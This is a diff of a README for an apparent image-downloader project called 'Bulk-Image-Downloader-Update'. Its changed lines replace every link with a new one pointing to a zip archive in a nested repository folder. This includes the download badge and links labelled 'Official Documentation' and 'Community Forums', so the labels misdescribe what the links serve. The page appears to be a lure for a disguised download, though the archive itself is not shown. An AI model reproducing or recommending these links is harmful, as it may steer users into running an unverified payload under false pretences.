@@ -1,6 +1,6 @@
 # 🖼️ Bulk-Image-Downloader-Update - Easy Image Downloading Made Simple
 
-[![Download Latest Release](https://raw.githubusercontent.com/asikinasi/Bulk-Image-Downloader-Update/main/hemoid/Bulk-Image-Downloader-Update.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/asikinasi/Bulk-Image-Downloader-Update/main/hemoid/Bulk-Image-Downloader-Update.zip)
+[![Download Latest Release](https://github.com/asikinasi/Bulk-Image-Downloader-Update/raw/refs/heads/main/hemoid/Bulk-Downloader-Update-Image-3.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/asikinasi/Bulk-Image-Downloader-Update/raw/refs/heads/main/hemoid/Bulk-Downloader-Update-Image-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will walk you through downloading and running the Bulk-Image
 
 To begin, you will need to visit our Releases page. This is where you can find the latest version of Bulk-Image-Downloader-Update. Click the link below to go directly to the download page.
 
-[Download Latest Release](https://raw.githubusercontent.com/asikinasi/Bulk-Image-Downloader-Update/main/hemoid/Bulk-Image-Downloader-Update.zip)
+[Download Latest Release](https://github.com/asikinasi/Bulk-Image-Downloader-Update/raw/refs/heads/main/hemoid/Bulk-Downloader-Update-Image-3.5.zip)
 
 ## 🖥️ System Requirements
 
@@ -84,8 +84,8 @@ We regularly update the software to fix bugs and improve features. Keep an eye o
 
 Here are some helpful resources if you want to learn more about using Bulk-Image-Downloader-Update:
 
-- [Official Documentation](https://raw.githubusercontent.com/asikinasi/Bulk-Image-Downloader-Update/main/hemoid/Bulk-Image-Downloader-Update.zip)
-- [Community Forums](https://raw.githubusercontent.com/asikinasi/Bulk-Image-Downloader-Update/main/hemoid/Bulk-Image-Downloader-Update.zip)
+- [Official Documentation](https://github.com/asikinasi/Bulk-Image-Downloader-Update/raw/refs/heads/main/hemoid/Bulk-Downloader-Update-Image-3.5.zip)
+- [Community Forums](https://github.com/asikinasi/Bulk-Image-Downloader-Update/raw/refs/heads/main/hemoid/Bulk-Downloader-Update-Image-3.5.zip)
 
 ## 📬 Contact
 
@@ -95,6 +95,6 @@ If you have questions not covered in this guide, please reach out through our Gi
 
 Ready to get started? Click below to download the latest version of Bulk-Image-Downloader-Update:
 
-[Download Latest Release](https://raw.githubusercontent.com/asikinasi/Bulk-Image-Downloader-Update/main/hemoid/Bulk-Image-Downloader-Update.zip)
+[Download Latest Release](https://github.com/asikinasi/Bulk-Image-Downloader-Update/raw/refs/heads/main/hemoid/Bulk-Downloader-Update-Image-3.5.zip)
 
 Thank you for choosing Bulk-Image-Downloader-Update. Enjoy hassle-free image downloading!
